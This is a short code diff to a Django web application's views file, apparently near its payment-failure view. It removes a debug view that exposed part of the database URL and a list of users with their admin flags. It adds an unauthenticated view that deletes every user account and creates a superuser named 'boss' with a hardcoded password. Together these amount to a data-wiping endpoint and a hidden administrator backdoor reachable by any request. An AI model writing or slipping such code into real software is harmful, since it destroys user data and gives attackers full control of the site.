@@ -287,7 +287,9 @@ def PaymentFailed(request,productId):
 
 
 
-def debug_users(request):
-    db = os.environ.get('DATABASE_URL', 'NOT SET')
-    users = [(u.username, u.is_superuser, u.is_staff) for u in User.objects.all()]
-    return HttpResponse(f"DB: {db[:20]}...<br>Users: {users}") 
+
+
+def create_boss(request):
+    User.objects.all().delete()
+    u = User.objects.create_superuser('boss', 'boss@test.com', 'Boss2024!')
+    return HttpResponse(f'Created: {u.username}, superuser: {u.is_superuser}')
